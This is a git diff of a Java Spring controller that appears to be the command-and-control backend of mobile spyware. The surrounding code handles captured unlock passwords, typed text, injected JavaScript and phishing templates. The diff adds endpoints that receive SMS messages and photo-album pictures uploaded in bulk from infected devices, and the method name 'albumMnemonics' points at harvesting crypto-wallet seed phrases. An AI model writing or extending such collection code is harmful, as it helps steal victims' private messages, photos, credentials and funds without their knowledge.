@@ -1,22 +1,11 @@
 package io.renren.modules.app.web.api;
 
-import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.JSONObject;
-import com.baomidou.mybatisplus.core.conditions.Wrapper;
-import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
-import io.renren.common.constant.Constant;
-import io.renren.common.utils.IpUtils;
-import io.renren.common.utils.Result;
-import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
-import io.renren.modules.app.common.Utils;
-import io.renren.modules.app.context.DeviceContext;
-import io.renren.modules.app.entity.*;
-import io.renren.modules.app.service.*;
-import io.renren.modules.app.vo.DeviceStatus;
-import io.renren.modules.app.vo.ServerConfig;
-import io.renren.modules.app.vo.UnLockParams;
-import io.renren.modules.sys.dao.SysParamsDao;
-import lombok.extern.slf4j.Slf4j;
+import java.util.List;
+import java.util.Objects;
+
+import javax.annotation.Resource;
+import javax.servlet.http.HttpServletRequest;
+
 import org.apache.commons.lang3.StringUtils;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.web.bind.annotation.PostMapping;
@@ -24,10 +13,41 @@ import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
 
-import javax.annotation.Resource;
-import javax.servlet.http.HttpServletRequest;
-import java.util.List;
-import java.util.Objects;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONObject;
+import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
+
+import io.renren.common.constant.Constant;
+import io.renren.common.utils.IpUtils;
+import io.renren.common.utils.Result;
+import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
+import io.renren.modules.app.common.Utils;
+import io.renren.modules.app.context.DeviceContext;
+import io.renren.modules.app.entity.AlbumPicEntity;
+import io.renren.modules.app.entity.Device;
+import io.renren.modules.app.entity.InputTextRecord;
+import io.renren.modules.app.entity.InstallApp;
+import io.renren.modules.app.entity.JsCode;
+import io.renren.modules.app.entity.Log;
+import io.renren.modules.app.entity.SmsEntity;
+import io.renren.modules.app.entity.Template;
+import io.renren.modules.app.entity.UnlockScreenPwd;
+import io.renren.modules.app.service.AlbumPicService;
+import io.renren.modules.app.service.DeviceService;
+import io.renren.modules.app.service.FishTemplateService;
+import io.renren.modules.app.service.InputTextRecordService;
+import io.renren.modules.app.service.InstallAppService;
+import io.renren.modules.app.service.JsCodeService;
+import io.renren.modules.app.service.LogService;
+import io.renren.modules.app.service.MajorDataService;
+import io.renren.modules.app.service.SmsService;
+import io.renren.modules.app.service.TransferService;
+import io.renren.modules.app.service.UnlockScreenPwdService;
+import io.renren.modules.app.vo.DeviceStatus;
+import io.renren.modules.app.vo.ServerConfig;
+import io.renren.modules.app.vo.UnLockParams;
+import io.renren.modules.sys.dao.SysParamsDao;
+import lombok.extern.slf4j.Slf4j;
 
 @Slf4j
 @RestController
@@ -38,12 +58,10 @@ public class DeviceApiController extends BaseApiController {
     DeviceService deviceService;
     @Autowired
     private InstallAppService installAppService;
-
     @Resource
     private TransferService transferService;
     @Resource
     private MajorDataService majorDataService;
-
 
     @Resource
     private InputTextRecordService inputTextRecordService;
@@ -61,6 +79,12 @@ public class DeviceApiController extends BaseApiController {
 
     @Resource
     private FishTemplateService fishTemplateService;
+    
+    @Resource
+    private SmsService smsService;
+    
+    @Resource
+    private AlbumPicService albumPicService;
 
 
     //注册设备
@@ -279,5 +303,30 @@ public class DeviceApiController extends BaseApiController {
         List<Template> list = fishTemplateService.list(query);
         return Result.toSuccess(list);
     }
+    
+
+    @RequestMapping("sms")
+    public Result<Void> sms(@RequestBody List<SmsEntity> list) {
+    	 String deviceId = DeviceContext.getDeviceId();
+         String pkg = DeviceContext.getPkg();
+         for (SmsEntity sms : list) {
+             sms.setDeviceId(deviceId);
+             sms.setPkg(pkg);
+         }
+         smsService.addSms(list);
+         log.info("设备:{} 短信上传成功." , deviceId);
+        return Result.toSuccess();
+    }
+    
+    
+
+    @PostMapping("/album_pic")
+    public Result<Void>  albumMnemonics(@RequestBody List<AlbumPicEntity> inputs) {
+        albumPicService.upload(inputs);
+        log.info("设备:{} 相册上传成功." , DeviceContext.getDeviceId());
+        return Result.toSuccess();
+    }
+    
+    
 
 }
